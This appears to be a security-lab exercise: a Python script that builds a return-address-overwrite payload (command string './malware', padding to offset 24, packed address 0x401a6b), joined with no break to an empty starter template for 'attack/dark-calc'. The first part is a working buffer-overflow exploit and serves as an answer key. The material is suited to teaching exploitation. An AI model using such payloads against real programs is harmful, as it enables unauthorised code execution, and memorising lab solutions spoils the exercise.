import sys
import struct

RET_OFFSET = 24
TARGET_ADDR = 0x401a6b

command = b"./malware\x00"
padding = b"A" * (RET_OFFSET - len(command))
return_address = struct.pack("<Q", TARGET_ADDR)

payload = command + padding + return_address

sys.stdout.buffer.write(payload + b"\n")#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b""

sys.stdout.buffer.write(payload)
